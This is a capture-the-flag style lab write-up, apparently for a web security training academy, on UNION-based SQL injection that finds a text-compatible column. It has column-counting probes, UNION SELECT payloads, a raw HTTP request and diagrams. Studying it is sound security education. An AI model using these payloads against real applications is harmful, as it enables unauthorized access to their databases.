
---

# SQL Injection - Lab #4: 

## SQL injection UNION attack, finding a column containing text

**YouTube Tutorial:** [SQL Injection - Lab #4 SQL injection UNION attack, finding a column containing text](https://www.youtube.com/watch?v=SGBTC5D7DTs)

---

## 1. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Core Concept:** A SQL injection vulnerability exists in the product category filter (`category`). The application processes user input directly into an SQL query and returns the query results directly within the HTTP response body.
* **Vulnerability Behavior:** Because the response contains database output, an attacker can leverage a `UNION`-based SQL injection to append their own database queries and extract data.

### Root Cause & Impact

* **Root Cause:** Unsanitized string concatenation in backend database queries.
* **Requirements for UNION Exploitation:**
1. The injected `SELECT` query must return the exact same number of columns as the original query.
2. The data types of corresponding columns must be compatible across both queries.


* **Goal:** Determine which specific column returned by the original query is compatible with `string` (text) data, and execute a `UNION SELECT` attack returning an additional row containing the lab's provided target string.

---

## 2. Attack Methods & Techniques

### Method Details

* **Phase 1 (Column Count Enumeration):** Use `ORDER BY N--` or `UNION SELECT NULL...` to identify the total number of columns returned by the query.
* **Phase 2 (Data Type Identification):** Systematically replace each `NULL` value in the `UNION SELECT` statement with a string literal (e.g., `'a'`) one column position at a time while leaving the other positions as `NULL`.

### Server Behavior

* **Incompatible Data Type / Syntax Error:** If a string literal `'a'` is placed into a column position that expects a non-string data type (such as an integer ID), the SQL engine throws a type mismatch error, causing the server to return an **HTTP 500 Internal Server Error**.
* **Compatible Data Type:** When the string literal is placed in a string-compatible column position, the query executes successfully, returning an **HTTP 200 OK** and rendering the injected value on the page.

---

## 3. Attack Flowchart

```
+-------------------------------------------------------+
|  Step 1: Intercept Product Filter Request (category)  |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 2: Determine Column Count (ORDER BY N--)        |
|  • ORDER BY 1, 2, 3 -> HTTP 200 OK                    |
|  • ORDER BY 4       -> HTTP 500 Error                 |
|  Result: Total = 3 Columns                            |
+-------------------------------------------------------+
                           |
                           v
+-------------------------------------------------------+
|  Step 3: Test Data Types (UNION SELECT 'a'...)        |
+-------------------------------------------------------+
                           |
            +--------------+--------------+
            |                             |
            v                             v
  [Test Column 1]               [Test Column 2]
  UNION SELECT 'a',NULL,NULL--  UNION SELECT NULL,'a',NULL--
  -> HTTP 500 Error             -> HTTP 200 OK
  (Not a string type)           (String Compatible!)
                                          |
                                          v
                                [Test Column 3]
                                UNION SELECT NULL,NULL,'a'--
                                -> HTTP 500 Error
                                (Not a string type)
                           |
                           v
+-------------------------------------------------------+
|  Step 4: Inject Required Random String into Column 2  |
|  UNION SELECT NULL, 'xyz123', NULL--                  |
|  -> HTTP 200 OK (Lab Solved)                          |
+-------------------------------------------------------+

```

---

## 4. UML Sequence Diagram

```
Browser / User          Burp Suite Proxy          Web Application               Database
      |                         |                        |                         |
      |-- 1. GET /filter?cat=Gifts' ORDER BY 4-- ------->|                         |
      |                         |                        |-- 2. Execute SQL ------>|
      |                         |                        |<-- 3. Out-Of-Bounds ----|
      |<-- 4. HTTP 500 Error ---|<-- 5. Return 500 -------|                         |
      |                         |                        |                         |
      |== 6. Column count confirmed = 3 columns ===================================|
      |                         |                        |                         |
      |-- 7. GET /filter?cat=Gifts' UNION SELECT NULL,'a',NULL-- ----------------->|
      |                         |                        |-- 8. Execute UNION ---->|
      |                         |                        |<-- 9. Row Returned -----|
      |<-- 10. HTTP 200 OK -----|<-- 11. Render 'a' -------|                         |
      |                         |                        |                         |
      |-- 12. GET /filter?cat=Gifts' UNION SELECT NULL,'<TARGET_STRING>',NULL-- -->|
      |                         |                        |-- 13. Execute UNION --->|
      |                         |                        |<-- 14. Target Injected -|
      |<-- 15. Lab Solved! -----|<-- 16. HTTP 200 OK -----|                         |

```

---

## 5. Step-by-Step Walkthrough

### Step 1: Determine Column Count

1. Test index ordering using `ORDER BY`:
* `GET /filter?category=Gifts'+ORDER+BY+1--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+2--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+3--` $\rightarrow$ **HTTP 200 OK**
* `GET /filter?category=Gifts'+ORDER+BY+4--` $\rightarrow$ **HTTP 500 Internal Server Error**


2. **Result:** Query returns **3 columns**.

### Step 2: Identify String-Compatible Column Position

Iteratively test each column position with a string value while keeping the others as `NULL`.

* **Test Column 1:**
`GET /filter?category=Gifts'+UNION+SELECT+'a',+NULL,+NULL--`
$\rightarrow$ **HTTP 500 Internal Server Error** *(Column 1 is non-string, likely an integer ID)*.
* **Test Column 2:**
`GET /filter?category=Gifts'+UNION+SELECT+NULL,+'a',+NULL--`
$\rightarrow$ **HTTP 200 OK** *(Column 2 accepts string values)*.
* **Test Column 3:**
`GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+'a'--`
$\rightarrow$ **HTTP 500 Internal Server Error** *(Column 3 is non-string)*.

### Step 3: Solve the Lab

Inject the random string generated by the lab instructions into the second column position:

* **Payload:**
```sql
Gifts' UNION SELECT NULL, 'a1b2c3d4', NULL--

```


* **Raw Request:**
```http
GET /filter?category=Gifts%27+UNION+SELECT+NULL%2C%27a1b2c3d4%27%2CNULL-- HTTP/1.1
Host: [LAB-ID].web-security-academy.net

```


* **Response:** **HTTP 200 OK** $\rightarrow$ **Lab Solved Successfully**.

---

## 6. Pro-Tips & Common Pitfalls

* **Hidden vs. Displayed Columns:** A query might return 3 columns, but not all returned columns are necessarily rendered on the HTML page. Testing with string literals verifies both backend data type compatibility and front-end display rendering.
* **Preserving NULLs:** When testing column compatibility, only replace one `NULL` position at a time with a test string. Replacing multiple `NULL`s at once makes it difficult to pinpoint which specific column failed the type check.
* **URL Encoding:** Always URL-encode special characters in parameters (`'` to `%27`, spaces to `+` or `%20`, `#` to `%23`) to ensure payloads are correctly parsed by the application server.